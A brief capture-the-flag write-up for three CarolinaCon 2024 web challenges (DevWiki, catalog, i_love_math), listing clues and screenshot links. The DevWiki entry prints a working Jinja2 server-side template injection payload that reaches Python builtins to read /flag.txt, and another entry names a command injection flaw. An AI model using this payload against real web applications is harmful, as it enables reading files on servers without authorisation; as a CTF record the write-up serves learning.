# DevWiki
### category: web

## clue
```
I forgot to copy the clue, it was a wiki webapp
```

## flag
SSTI:
```
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read() }}
```
![devwiki1](https://raw.githubusercontent.com/btaub/misc-scripts/refs/heads/master/ctf/carolinaCon-2024/images/devwiki1.png)
![devwiki2](https://raw.githubusercontent.com/btaub/misc-scripts/refs/heads/master/ctf/carolinaCon-2024/images/devwiki2.png)


---
# catalog
### category: web
## clue

```
We recently launched our website for a local bookstore after with a remote consulting company. The developer ensured us that it was secure. Our IT department is now hounding us about updates the developer needs to make because users are reporting they cannot find any books on the site.

Can you help us figure out what is going on?

[http://challenges.carolinacon.org:8012](http://challenges.carolinacon.org:8012)
```
## flag

![catalog.png](https://raw.githubusercontent.com/btaub/misc-scripts/refs/heads/master/ctf/carolinaCon-2024/images/catalog.png)

---

# i_love_math

### category: web

## clue

```
We were asked to host a calculator as a service for a client. It seems that some malicous attackers keep access our network environment using it's interface.

Can you help us figure out how?

[http://challenges.carolinacon.org:8010](http://challenges.carolinacon.org:8010)
```
## flag

command injection vuln

![i_love_math .png](https://raw.githubusercontent.com/btaub/misc-scripts/refs/heads/master/ctf/carolinaCon-2024/images/%20i_love_math%20.png)

